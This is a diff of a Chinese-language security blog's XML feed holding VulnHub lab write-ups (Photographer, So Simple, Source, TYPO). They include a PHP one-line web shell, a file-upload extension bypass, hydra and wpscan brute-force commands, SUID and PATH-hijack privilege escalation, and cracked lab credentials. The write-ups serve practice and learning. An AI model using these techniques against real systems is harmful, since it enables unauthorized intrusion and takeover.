+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Steps to exploit:</span><br><span class="line"></span><br><span class="line">1. Create a malicious PHP file with this content:</span><br><span class="line">1.创建一个包含以下内容的恶意PHP文件：</span><br><span class="line"></span><br><span class="line">   &lt;?php system($_GET[&#x27;cmd&#x27;]);?&gt;</span><br><span class="line"></span><br><span class="line">2. Save as &quot;image.php.jpg&quot;</span><br><span class="line">2.另存为“ image.php.jpg”</span><br><span class="line"></span><br><span class="line">3. Authenticated, go to Koken CMS Dashboard, upload your file on &quot;Import Content&quot; button (Library panel) and send the HTTP request to Burp.</span><br><span class="line">3. 通过身份验证后，转到Koken CMS仪表板，在“导入内容”按钮（“库”面板）上上传文件，然后将HTTP请求发送到Burp。</span><br><span class="line"></span><br><span class="line">4. On Burp, rename your file to &quot;image.php&quot;</span><br><span class="line">4.在Burp上，将文件重命名为“ image.php”</span><br><span class="line"></span><br><span class="line">5. On Koken CMS Library, select you file and put the mouse on &quot;Download File&quot; to see where your file is hosted on server.</span><br><span class="line">5.在Koken CMS库上，选择您的文件，然后将鼠标放在“下载文件”上，以查看文件在服务器上的托管位置。</span><br></pre></td></tr></table></figure>
+
+<p>说白了就是告诉你漏洞在哪里，怎么利用，找到上传点和绕过方式上传shell脚本就好了。<br>找了半天也没找到“Import Content”按钮，后来通过Ctrl+f5找到了该按钮(我以为在菜单栏呢)。<br><img src="https://img.xpctf.cn/img/20200808164953.png" alt=""></p>
+<p>写一个一句话保存成123.jpg(随意)，打开burp设置代理后到页面上传，拦截后把jpg后缀改成php<br><img src="https://img.xpctf.cn/img/20200808165450.png" alt=""></p>
+<p>上传完shell打开网站巨慢，不知道为什么。</p>
+<p>上传了很多遍后缀都是jpg，后来是我改错位置了(基础不牢)，仔细看了exploit-db的利用说明发现自己的问题。</p>
+<p><img src="https://img.xpctf.cn/img/20200808172341.png" alt=""></p>
+<p>上传完右边有个连接，复制打开<br><img src="https://img.xpctf.cn/img/20200808172910.png" alt=""></p>
+<p>点击“Download File”提取直链，添加到蚂🗡中，右键虚拟终端<br><img src="https://img.xpctf.cn/img/20200808173202.png" alt=""></p>
+<p>使用finde搜索：find / -name user.txt 2&gt;/dev/null</p>
+<p>发现在/home/daisa/user.txt下，使用cat成功获得第一个flag：d41d8cd98f00b204e9800998ecf8427e<br><img src="https://img.xpctf.cn/img/20200808173936.png" alt=""><br>继续使用相同的方法搜索proof.txt,结果返回为空。先吃饭继续提权</p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>使用<code>find / -perm -u=s -type f 2&gt;/dev/null</code>命令查找www用户有sudo权限的命令用于提权，最终先择php7.2命令<br><img src="https://img.xpctf.cn/img/20200808194045.png" alt=""><br>在终端中输入<code>/usr/bin/php7.2 -r &quot;pcntl_exec(&#39;/bin/bash&#39;, [&#39;-p&#39;]);&quot;</code>进行权限提升，通过whoami发现没有提权成功。<br><img src="https://img.xpctf.cn/img/20200808194138.png" alt=""><br>使用msfvenom生成反弹shell，上传到服务器成功反弹shell，使用php7.2提权成功。获得proof.txt。<br><img src="https://img.xpctf.cn/img/20200808194419.png" alt=""></p>
+<h2 id="实验总计"><a href="#实验总计" class="headerlink" title="实验总计"></a>实验总计</h2><p>这是我第一次尝试综合靶机，但是难度不算大，我预期的结果是获得完美的root权限的，但是终究力不从心。<br>还得学习！！！</p>
+]]></content>
+      <categories>
+        <category>vulnhub</category>
+      </categories>
+      <tags>
+        <tag>Writeup</tag>
+        <tag>Photographer</tag>
       </tags>
   </entry>
   <entry>
@@ -950,6 +950,28 @@
       </tags>
   </entry>
   <entry>
+    <title>So Simple: 1 Writeup</title>
+    <url>/posts/e470/</url>
+    <content><![CDATA[<blockquote>
+<p>This is an easy level VM with some rabbitholes. Enumeration is key to find your way in. There are three flags (2 user and 1 root flag).<br>The VM is tested on Virtualbox. After the startup it shows the IP address.<br>Share your rootflag with me on Twitter: @roelvb79<br>Good luck and have fun!<br>This works better with VirtualBox rather than VMware</p>
+</blockquote>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>登录界面已经输出了IP地址，直接nmap扫描起<br>就开放了22端口了80端口<br><img src="https://img.xpctf.cn/img/20200813211954.png" alt=""></p>
+<h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p>描述：<code>这是带有一些兔子洞的简单级别的VM。枚举是您找到路的关键</code>,<br>我们使用hxdra爆破ssh，命令：<code>hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 192.168.1.18 ssh</code><br><img src="https://img.xpctf.cn/img/20200813211850.png" alt=""><br>ssh不支持密码验证，考虑扫描目录，可能存在密钥文件。</p>
+<p>打开Web查看什么都没有，很干净，执行目录扫描！<br><img src="https://img.xpctf.cn/img/20200813212346.png" alt=""><br>发现一个wordpress目录，打开确实是wordpress程序</p>
+<p>继续扫描Web，使用wpscan扫描wordpress，命令：<code>wpscan --url http://192.168.1.18/wordpress/ -e u,p</code><br>发现admin，max账号，对这两个账号继续进行枚举攻击，命令：<code>wpscan --url http://192.168.1.18/wordpress/ -U username -P /usr/share/wordlists/dicr.txt -t 100</code>，尝试使用不同的字典爆破。<br><img src="https://img.xpctf.cn/img/20200813213227.png" alt=""><br>[SUCCESS] - max / opensesame<br>爆破出了max账号的密码，admin等他继续爆破，先登录max看看；爆破了一晚上也没有结果，看来是无望了。<br>看到wpscan识别出了两款插件，Google搜索插件版本的exploit；<br><img src="https://img.xpctf.cn/img/20200814083826.png" alt=""><br>看到了搜索结果：WordPress Plugin Social Warfare &lt; 3.5.3 - Exploit Database，说明可以符合利用条件。<br><img src="https://img.xpctf.cn/img/20200814083908.png" alt=""></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>根据描述发现目标版本符合漏洞利用条件，把exp复制到kali保存，运行脚本<br><img src="https://img.xpctf.cn/img/20200814084344.png" alt=""><br>需要提供一个有payload的url给他，代码执行漏洞那我写一个php代码；使用python临时搭建http服务。<br><img src="https://img.xpctf.cn/img/20200814085644.png" alt=""><br>这玩意也不行啊，好像paylaod得直接返回shell，不是什么payload都能执行，我们看一下脚本。<br><img src="https://img.xpctf.cn/img/20200814090021.png" alt=""><br>输出脚本url手动测试，但是输出得时候发现wordpress没了，只有IP。<br>后来通过搜索得到了一篇详细得利用说明，最后获得webshell。<br><img src="https://img.xpctf.cn/img/20200814091713.png" alt=""><br>通过中国蚁剑连接到服务器，然后执行伪终端进一步提权！<br>参考链接：<a href="https://blog.csdn.net/weixin_30672019/article/details/99381863">https://blog.csdn.net/weixin_30672019/article/details/99381863</a></p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>使用<code>cat /etc/passwd|grep /bin/bash</code>查看可以登录的用户；<code>cd /home</code>查看用户flag，结果没有max用户权限，试试steven用户。<br><img src="https://img.xpctf.cn/img/20200814092126.png" alt=""><br>steven用户也没有权限，我之前爆破出max的密码，使用<code>su max</code>尝试登陆，结果：<code>Password: su: Authentication failure</code><br>看来还得提权到max，<code>ls -la</code>查看隐藏文件；有.ssh文件，还记得上面说的寻找ssh密钥吗？<br><img src="https://img.xpctf.cn/img/20200814092841.png" alt=""><br>把id_rsa复制到kali，然后使用ssh密钥登录max的ssh。<br><img src="https://img.xpctf.cn/img/20200814093050.png" alt=""><br>成功提权到max并获得第一个flag：073dafccfe902526cee753455ff1dbb0<br><img src="https://img.xpctf.cn/img/20200814093301.png" alt=""><br>有lxd权限，可以使用lxd提权；刚好上次靶机的lxd提权脚本还在。<br><img src="https://img.xpctf.cn/img/20200814094302.png" alt=""><br>exploit：<a href="https://www.exploit-db.com/exploits/46978">https://www.exploit-db.com/exploits/46978</a></p>
+<h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><p>home/max/user.txt：073dafccfe902526cee753455ff1dbb0<br>home/steven/user2.txt：b662b31b7d8cb9f5cdc9c2010337f9b8<br>root/flag.txt：Easy box right? Hope you’ve had fun! Show me the flag on Twitter @roelvb79</p>
+]]></content>
+      <categories>
+        <category>vulnhub</category>
+      </categories>
+      <tags>
+        <tag>Writeup</tag>
+        <tag>So Simple</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>SQL注入学习笔记2</title>
     <url>/posts/d106/</url>
     <content><![CDATA[<h2 id="一、未知列名注入"><a href="#一、未知列名注入" class="headerlink" title="一、未知列名注入"></a>一、未知列名注入</h2><p>未知列名注入一般用于过滤column，通过不需要查询列名的方式来获取数据。</p>
@@ -1005,46 +1027,23 @@
       </tags>
   </entry>
   <entry>
-    <title>So Simple: 1 Writeup</title>
-    <url>/posts/e470/</url>
-    <content><![CDATA[<blockquote>
-<p>This is an easy level VM with some rabbitholes. Enumeration is key to find your way in. There are three flags (2 user and 1 root flag).<br>The VM is tested on Virtualbox. After the startup it shows the IP address.<br>Share your rootflag with me on Twitter: @roelvb79<br>Good luck and have fun!<br>This works better with VirtualBox rather than VMware</p>
-</blockquote>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>登录界面已经输出了IP地址，直接nmap扫描起<br>就开放了22端口了80端口<br><img src="https://img.xpctf.cn/img/20200813211954.png" alt=""></p>
-<h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p>描述：<code>这是带有一些兔子洞的简单级别的VM。枚举是您找到路的关键</code>,<br>我们使用hxdra爆破ssh，命令：<code>hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 192.168.1.18 ssh</code><br><img src="https://img.xpctf.cn/img/20200813211850.png" alt=""><br>ssh不支持密码验证，考虑扫描目录，可能存在密钥文件。</p>
-<p>打开Web查看什么都没有，很干净，执行目录扫描！<br><img src="https://img.xpctf.cn/img/20200813212346.png" alt=""><br>发现一个wordpress目录，打开确实是wordpress程序</p>
-<p>继续扫描Web，使用wpscan扫描wordpress，命令：<code>wpscan --url http://192.168.1.18/wordpress/ -e u,p</code><br>发现admin，max账号，对这两个账号继续进行枚举攻击，命令：<code>wpscan --url http://192.168.1.18/wordpress/ -U username -P /usr/share/wordlists/dicr.txt -t 100</code>，尝试使用不同的字典爆破。<br><img src="https://img.xpctf.cn/img/20200813213227.png" alt=""><br>[SUCCESS] - max / opensesame<br>爆破出了max账号的密码，admin等他继续爆破，先登录max看看；爆破了一晚上也没有结果，看来是无望了。<br>看到wpscan识别出了两款插件，Google搜索插件版本的exploit；<br><img src="https://img.xpctf.cn/img/20200814083826.png" alt=""><br>看到了搜索结果：WordPress Plugin Social Warfare &lt; 3.5.3 - Exploit Database，说明可以符合利用条件。<br><img src="https://img.xpctf.cn/img/20200814083908.png" alt=""></p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>根据描述发现目标版本符合漏洞利用条件，把exp复制到kali保存，运行脚本<br><img src="https://img.xpctf.cn/img/20200814084344.png" alt=""><br>需要提供一个有payload的url给他，代码执行漏洞那我写一个php代码；使用python临时搭建http服务。<br><img src="https://img.xpctf.cn/img/20200814085644.png" alt=""><br>这玩意也不行啊，好像paylaod得直接返回shell，不是什么payload都能执行，我们看一下脚本。<br><img src="https://img.xpctf.cn/img/20200814090021.png" alt=""><br>输出脚本url手动测试，但是输出得时候发现wordpress没了，只有IP。<br>后来通过搜索得到了一篇详细得利用说明，最后获得webshell。<br><img src="https://img.xpctf.cn/img/20200814091713.png" alt=""><br>通过中国蚁剑连接到服务器，然后执行伪终端进一步提权！<br>参考链接：<a href="https://blog.csdn.net/weixin_30672019/article/details/99381863">https://blog.csdn.net/weixin_30672019/article/details/99381863</a></p>
-<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>使用<code>cat /etc/passwd|grep /bin/bash</code>查看可以登录的用户；<code>cd /home</code>查看用户flag，结果没有max用户权限，试试steven用户。<br><img src="https://img.xpctf.cn/img/20200814092126.png" alt=""><br>steven用户也没有权限，我之前爆破出max的密码，使用<code>su max</code>尝试登陆，结果：<code>Password: su: Authentication failure</code><br>看来还得提权到max，<code>ls -la</code>查看隐藏文件；有.ssh文件，还记得上面说的寻找ssh密钥吗？<br><img src="https://img.xpctf.cn/img/20200814092841.png" alt=""><br>把id_rsa复制到kali，然后使用ssh密钥登录max的ssh。<br><img src="https://img.xpctf.cn/img/20200814093050.png" alt=""><br>成功提权到max并获得第一个flag：073dafccfe902526cee753455ff1dbb0<br><img src="https://img.xpctf.cn/img/20200814093301.png" alt=""><br>有lxd权限，可以使用lxd提权；刚好上次靶机的lxd提权脚本还在。<br><img src="https://img.xpctf.cn/img/20200814094302.png" alt=""><br>exploit：<a href="https://www.exploit-db.com/exploits/46978">https://www.exploit-db.com/exploits/46978</a></p>
-<h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><p>home/max/user.txt：073dafccfe902526cee753455ff1dbb0<br>home/steven/user2.txt：b662b31b7d8cb9f5cdc9c2010337f9b8<br>root/flag.txt：Easy box right? Hope you’ve had fun! Show me the flag on Twitter @roelvb79</p>
-]]></content>
-      <categories>
-        <category>vulnhub</category>
-      </categories>
-      <tags>
-        <tag>Writeup</tag>
-        <tag>So Simple</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>TYPO: 1 Writeup</title>
-    <url>/posts/a300/</url>
-    <content><![CDATA[<p>开机显示IP，直接Nmap扫描:<code>nmap -A -p- -v -T4 -oA nmap 192.168.10.59</code><br>发现开了4个HTTP协议的端口，还有一个22端口，对http协议端口进行url枚举，<br>8080端口发现一个phpinfo：<a href="http://192.168.10.59:8080/phpinfo.php">http://192.168.10.59:8080/phpinfo.php</a><br>8081端口发现一个phpmyadmin：<a href="http://192.168.10.59:8081/phpmyadmin/">http://192.168.10.59:8081/phpmyadmin/</a><br>80端口发现一个typo3 cms：<a href="http://192.168.10.59/typo3/">http://192.168.10.59/typo3/</a><br>对phpmyadmin进行root:root弱口令登录，结果登录成功了。<br><img src="https://img.xpctf.cn/img/20200924150953.png-xpctf" alt=""><br>登录后发现是phpmyadmin版本是5.0.2，搜索phpmyadmin的getshell，但最后都没能成功。</p>
-<p>继续找typo3的用户表，但这个加密奇怪，直接进行替换。百度搜了一个typo3搭建到本地，用也知明文的密文替换靶机的密码，成功登录到后台。(后来我发现直接使用openssl生成一个密码也可以)<br><img src="https://img.xpctf.cn/img/20200924151138.png-xpctf" alt=""><br>写博客前偷瞄师傅的wp说argon2id这个是一种加密方式，在线网站：<a href="https://argon2.online/">https://argon2.online/</a><br><img src="https://img.xpctf.cn/img/20200924152009.png-xpctf" alt=""></p>
-<p>登录成功后就是getshell，在file选项卡找到一个文件上传的界面<br><img src="https://img.xpctf.cn/img/20200924152157.png-xpctf" alt=""><br>但是无法上传php文件，又偷瞄了一眼师傅博客发现设置里可以修改。<br><img src="https://img.xpctf.cn/img/20200924152329.png-xpctf" alt=""><br>找到fileDenyPattern设置项把里面的内容全部删除后点击“Write configuration”<br><img src="https://img.xpctf.cn/img/20200924152648.png-xpctf" alt=""></p>
-<p>修改设置后继续上传就能成功，接下来就是找文件路径，其实配置文件就有上传路径<br><img src="https://img.xpctf.cn/img/20200924152856.png-xpctf" alt=""><br>我们访问上传的webshell成功获得反弹shell，继续对机器进行提权<br><img src="https://img.xpctf.cn/img/20200924153125.png-xpctf" alt=""><br>经过检查发现没有多余用户，那就是直接提权到root用户，看了一下内核版本很高；查看了suid发现了一个很可疑的文件apache2-restart，对他进行逆向发现执行了<code>service apache2 start</code>，难怪名字叫apache2-restart。(就瞄了一眼)<br><img src="https://img.xpctf.cn/img/20200924153437.png-xpctf" alt=""></p>
-<p>当执行clear命令出现以下报错是，设置TERM变量即可：<code>export TERM=xterm-256color</code></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> clear</span></span><br><span class="line">TERM environment variable not set.</span><br></pre></td></tr></table></figure>
+    <title>Source writeup</title>
+    <url>/posts/4a31/</url>
+    <content><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>找到IP后直接上<code>nmap -A -p- -T 4 192.168.1.134</code><br><img src="https://img.xpctf.cn/img/20200809110030.png" alt=""></p>
+<p>发现一个22，10000端口开放；10000端口是http协议，打开看看是什么东西。<br><img src="https://img.xpctf.cn/img/20200809110957.png" alt=""></p>
+<p>提示我们需要使用https协议访问 <a href="https://source:10000/">https://source:10000/</a><br>编辑本地hosts来实现域名访问，Windows需要去掉只读属性<br>Windows：D:\Program Files\cmder\vendor\git-for-windows\etc<br>Linux：/etc/hosts</p>
+<h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p>打开<a href="https://source:10000/">https://source:10000/</a> 发现是webmin，Google搜索webmin是什么<br><img src="https://img.xpctf.cn/img/20200809111712.png" alt=""><br>总计下来就是一句话，以web的方式管理服务器。10000是webmin的特定端口<br>msfconsole中搜索webmin，发现webmin的一个后门：exploit/linux/http/webmin_backdoor<br><img src="https://img.xpctf.cn/img/20200809115943.png" alt=""><br>使用use exploit/linux/http/webmin_backdoor模块<br>show options查看需要配置的选项，如下图配置<br><img src="https://img.xpctf.cn/img/20200809120158.png" alt=""><br><strong>注意：因为使用https协议，所以需要设置SSL为true，默认为flase且Required为no</strong></p>
+<h2 id="获得标志"><a href="#获得标志" class="headerlink" title="获得标志"></a>获得标志</h2><p>用户标志</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -name user.txt</span><br><span class="line">/home/dark/user.txt</span><br><span class="line">cat /home/dark/user.txt</span><br><span class="line">THM&#123;SUPPLY_CHAIN_COMPROMISE&#125;</span><br></pre></td></tr></table></figure>
 
-<p>通过修改环境变量(env)让service命令执行我们写的文件来提权，由于终端缺陷命令错了不能修改(手残)，所以写了一个脚本来执行。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd /tmp</span><br><span class="line">echo &#x27;/bin/bash&#x27; &gt; service</span><br><span class="line">chmod +x service</span><br><span class="line">/usr/local/bin/apache2-restart</span><br></pre></td></tr></table></figure>
-<p><img src="https://img.xpctf.cn/img/20200924154640.png-xpctf" alt=""></p>
-]]></content>
+<p>Root标志</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -name root.txt</span><br><span class="line">/root/root.txt</span><br><span class="line">cat /root/root.txt</span><br><span class="line">THM&#123;UPDATE_YOUR_INSTALL&#125;</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>vulnhub</category>
       </categories>
       <tags>
         <tag>Writeup</tag>
+        <tag>Source</tag>
       </tags>
   </entry>
   <entry>
@@ -1083,6 +1082,27 @@
       </tags>
   </entry>
   <entry>
+    <title>TYPO: 1 Writeup</title>
+    <url>/posts/a300/</url>
+    <content><![CDATA[<p>开机显示IP，直接Nmap扫描:<code>nmap -A -p- -v -T4 -oA nmap 192.168.10.59</code><br>发现开了4个HTTP协议的端口，还有一个22端口，对http协议端口进行url枚举，<br>8080端口发现一个phpinfo：<a href="http://192.168.10.59:8080/phpinfo.php">http://192.168.10.59:8080/phpinfo.php</a><br>8081端口发现一个phpmyadmin：<a href="http://192.168.10.59:8081/phpmyadmin/">http://192.168.10.59:8081/phpmyadmin/</a><br>80端口发现一个typo3 cms：<a href="http://192.168.10.59/typo3/">http://192.168.10.59/typo3/</a><br>对phpmyadmin进行root:root弱口令登录，结果登录成功了。<br><img src="https://img.xpctf.cn/img/20200924150953.png" alt=""><br>登录后发现是phpmyadmin版本是5.0.2，搜索phpmyadmin的getshell，但最后都没能成功。</p>
+<p>继续找typo3的用户表，但这个加密奇怪，直接进行替换。百度搜了一个typo3搭建到本地，用也知明文的密文替换靶机的密码，成功登录到后台。(后来我发现直接使用openssl生成一个密码也可以)<br><img src="https://img.xpctf.cn/img/20200924151138.png" alt=""><br>写博客前偷瞄师傅的wp说argon2id这个是一种加密方式，在线网站：<a href="https://argon2.online/">https://argon2.online/</a><br><img src="https://img.xpctf.cn/img/20200924152009.png" alt=""></p>
+<p>登录成功后就是getshell，在file选项卡找到一个文件上传的界面<br><img src="https://img.xpctf.cn/img/20200924152157.png" alt=""><br>但是无法上传php文件，又偷瞄了一眼师傅博客发现设置里可以修改。<br><img src="https://img.xpctf.cn/img/20200924152329.png" alt=""><br>找到fileDenyPattern设置项把里面的内容全部删除后点击“Write configuration”<br><img src="https://img.xpctf.cn/img/20200924152648.png" alt=""></p>
+<p>修改设置后继续上传就能成功，接下来就是找文件路径，其实配置文件就有上传路径<br><img src="https://img.xpctf.cn/img/20200924152856.png" alt=""><br>我们访问上传的webshell成功获得反弹shell，继续对机器进行提权<br><img src="https://img.xpctf.cn/img/20200924153125.png" alt=""><br>经过检查发现没有多余用户，那就是直接提权到root用户，看了一下内核版本很高；查看了suid发现了一个很可疑的文件apache2-restart，对他进行逆向发现执行了<code>service apache2 start</code>，难怪名字叫apache2-restart。(就瞄了一眼)<br><img src="https://img.xpctf.cn/img/20200924153437.png" alt=""></p>
+<p>当执行clear命令出现以下报错是，设置TERM变量即可：<code>export TERM=xterm-256color</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> clear</span></span><br><span class="line">TERM environment variable not set.</span><br></pre></td></tr></table></figure>
+
+<p>通过修改环境变量(env)让service命令执行我们写的文件来提权，由于终端缺陷命令错了不能修改(手残)，所以写了一个脚本来执行。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd /tmp</span><br><span class="line">echo &#x27;/bin/bash&#x27; &gt; service</span><br><span class="line">chmod +x service</span><br><span class="line">/usr/local/bin/apache2-restart</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.xpctf.cn/img/20200924154640.png" alt=""></p>
+]]></content>
+      <categories>
+        <category>vulnhub</category>
+      </categories>
+      <tags>
+        <tag>Writeup</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Webdav 2017-7269漏洞复现</title>
     <url>/posts/65e3/</url>
     <content><![CDATA[<p><strong>Webdav漏洞已经是2017年的老漏洞了，但有些坑我还是踩了，所以写一篇文章吧！</strong></p>
@@ -1107,57 +1127,6 @@
       <tags>
         <tag>Webdav</tag>
         <tag>2017-7269</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Source writeup</title>
-    <url>/posts/4a31/</url>
-    <content><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>找到IP后直接上<code>nmap -A -p- -T 4 192.168.1.134</code><br><img src="https://img.xpctf.cn/img/20200809110030.png" alt=""></p>
-<p>发现一个22，10000端口开放；10000端口是http协议，打开看看是什么东西。<br><img src="https://img.xpctf.cn/img/20200809110957.png" alt=""></p>
-<p>提示我们需要使用https协议访问 <a href="https://source:10000/">https://source:10000/</a><br>编辑本地hosts来实现域名访问，Windows需要去掉只读属性<br>Windows：D:\Program Files\cmder\vendor\git-for-windows\etc<br>Linux：/etc/hosts</p>
-<h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p>打开<a href="https://source:10000/">https://source:10000/</a> 发现是webmin，Google搜索webmin是什么<br><img src="https://img.xpctf.cn/img/20200809111712.png" alt=""><br>总计下来就是一句话，以web的方式管理服务器。10000是webmin的特定端口<br>msfconsole中搜索webmin，发现webmin的一个后门：exploit/linux/http/webmin_backdoor<br><img src="https://img.xpctf.cn/img/20200809115943.png" alt=""><br>使用use exploit/linux/http/webmin_backdoor模块<br>show options查看需要配置的选项，如下图配置<br><img src="https://img.xpctf.cn/img/20200809120158.png" alt=""><br><strong>注意：因为使用https协议，所以需要设置SSL为true，默认为flase且Required为no</strong></p>
-<h2 id="获得标志"><a href="#获得标志" class="headerlink" title="获得标志"></a>获得标志</h2><p>用户标志</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -name user.txt</span><br><span class="line">/home/dark/user.txt</span><br><span class="line">cat /home/dark/user.txt</span><br><span class="line">THM&#123;SUPPLY_CHAIN_COMPROMISE&#125;</span><br></pre></td></tr></table></figure>
-
-<p>Root标志</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -name root.txt</span><br><span class="line">/root/root.txt</span><br><span class="line">cat /root/root.txt</span><br><span class="line">THM&#123;UPDATE_YOUR_INSTALL&#125;</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>vulnhub</category>
-      </categories>
-      <tags>
-        <tag>Writeup</tag>
-        <tag>Source</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Web代码审计常见函数</title>
-    <url>/posts/fbe3/</url>
-    <content><![CDATA[<p><strong>代码审计（Code audit）是一种以发现程序错误，安全漏洞和违反程序规范为目标的源代码分析。 软件代码审计是对编程项目中源代码的全面分析，旨在发现错误，安全漏洞或违反编程约定。 它是防御性编程范例的一个组成部分，它试图在软件发布之前减少错误。</strong></p>
-<ul>
-<li>require ‘flag.php’        #文件包含函数(高)</li>
-<li>count($value)           #获取数组成员数(低)</li>
-<li>chr($value)               #转ascii<br><img src="https://img.xpctf.cn/img/20200604095334.png" alt="PHP会对$value进行256的mod运算，取余"></li>
-<li>unset($value)             #销毁变量</li>
-<li>intval($value)                #转整数<br><img src="https://img.xpctf.cn/img/20200604101527.png" alt="PHP5 无法处理16进制字符串"><ul>
-<li>ereg(表达式,字符串,regs)<br>ereg函数是php4-5的正则匹配函数，如果没有找到匹配或出错则返回 FALSE。如果没有传递入可选参数 regs 或者所匹配的字符串长度为 0，则本函数返回 1。ereg函数在php7中已弃用，存在%00截断漏洞。</li>
-</ul>
-</li>
-<li>is_numeric($value)        #判断是否为数字或者数字字符串，bool型</li>
-<li>empty                #判断一个变量是否被认为是空的。当一个变量并不存在，或者它的值等同于FALSE，那么它会被认为不存在。如果变量不存在的话，empty()并不会产生警告。bool型</li>
-<li>preg_match ( string $pattern , string $subject [, array &amp;$matches [, int $flags = 0 [, int $offset = 0 ]]] ) : int<br>preg_match()返回 pattern 的匹配次数。 它的值将是0次（不匹配）或1次，因为preg_match()在第一次匹配后 将会停止搜索。preg_match_all()不同于此，它会一直搜索subject 直到到达结尾。 如果发生错误preg_match()返回 FALSE。</li>
-<li>json_encode — 对变量进行 JSON 编码<br>这个编码不是值把json格式的编码，是把其他格式的编码成json，和json_decode没关系。</li>
-<li>json_decode — 对 JSON 格式的字符串进行解码<br>这个解密是指识别json格式的字符串，不和base64那种一个编码一个解密一样，和json_encode没关系。</li>
-<li>strcmp — 二进制安全字符串比较<br>比较两个字符串，如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。</li>
-<li>eregi — 不区分大小写的正则表达式匹配<br>本函数和 ereg() 完全相同，只除了在匹配字母字符时忽略大小写的区别。</li>
-<li>strpos — 查找字符串首次出现的位置<br>完全匹配返回0，不完全匹配返回首次出现的位置；匹配失败返回flase</li>
-</ul>
-]]></content>
-      <categories>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>Web</tag>
       </tags>
   </entry>
   <entry>
@@ -1203,30 +1172,44 @@
       </tags>
   </entry>
   <entry>
-    <title>hacknos:os-hax writeup</title>
-    <url>/posts/e09f/</url>
-    <content><![CDATA[<p>通过<code>rp-scan -l</code>命令发现靶机IP，对靶机进行靶机扫描：<code>nmap -A -v -p- -oA nmap 192.168.10.61</code>，开放两个端口<br><img src="https://img.xpctf.cn/img/20200925173410.png-xpctf" alt=""><br>对80进行目录扫描，发现wordpress目录，直接访问wp-admin发现重定向到localhost；嗯？这是搞什么飞机，修改localhost指向靶机IP，wpscan扫描发现一个web用户，爆破失败；没有发现插件和主题漏洞。注意：需要注释掉第一行才能生效<br><img src="https://img.xpctf.cn/img/20200925174009.png-xpctf" alt=""><br>网站根目录像个cms，继续进行扫描，刚刚出现wp目录就停止了，后来发现了个img目录的文件很有意思，打开是一张hosts截图，应该是叫我们修改本地hosts。<br><img src="https://img.xpctf.cn/img/20200925173720.png-xpctf" alt=""><br>现在到本地使用exiftool分析图片，发现一个passw@45关键词，尝试wordpress登录和ssh登录，都失败了。<br><img src="https://img.xpctf.cn/img/20200925174249.png-xpctf" alt=""><br>后来通过加入字典扫描发现是一个目录，拿到flag2.txt。<br><img src="https://img.xpctf.cn/img/20200925174458.png-xpctf" alt=""></p>
-<p>打开后是一段密文，有点熟悉，但不知道叫什么，通过百度”ctf加密算法”关键字找到文章发现是brainfuck加密，解密后得到web用户密码，登录wordpress后修改主题404页面拿到webshell。<br>但是构造路径有点麻烦，这里打出来方便以后用：<a href="http://localhost/wordpress/wp-content/themes/twentysixteen/404.php">http://localhost/wordpress/wp-content/themes/twentysixteen/404.php</a></p>
-<p>CTF密码学常见加解密总结：<a href="https://blog.csdn.net/qq_40836553/article/details/79383488">https://blog.csdn.net/qq_40836553/article/details/79383488</a></p>
-<p>还有一个插件可以命令执行拿shell。<br><img src="https://img.xpctf.cn/img/20200925175155.png-xpctf" alt=""></p>
